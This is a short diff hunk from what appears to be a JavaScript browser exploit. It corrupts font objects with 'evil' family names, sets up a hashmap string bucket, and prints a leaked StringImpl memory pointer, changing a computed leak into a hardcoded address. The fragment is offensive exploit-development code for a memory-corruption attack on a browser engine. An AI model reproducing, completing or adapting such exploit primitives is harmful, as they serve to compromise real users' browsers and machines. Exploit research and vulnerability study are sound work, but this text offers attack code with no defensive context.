@@ -166,7 +166,7 @@ mkString(HASHMAP_BUCKET, p_s);
 bad_fonts[guessed_font].family = "evil2";
 bad_fonts[guessed_font+1].family = "evil3";
 
-var leak = stringToPtr(badstr2.substr(badstr2.length-8));
+var leak = 0x205354f84;
 alert("stringimpl leak: "+hex(leak));
 
 var ffses = {};
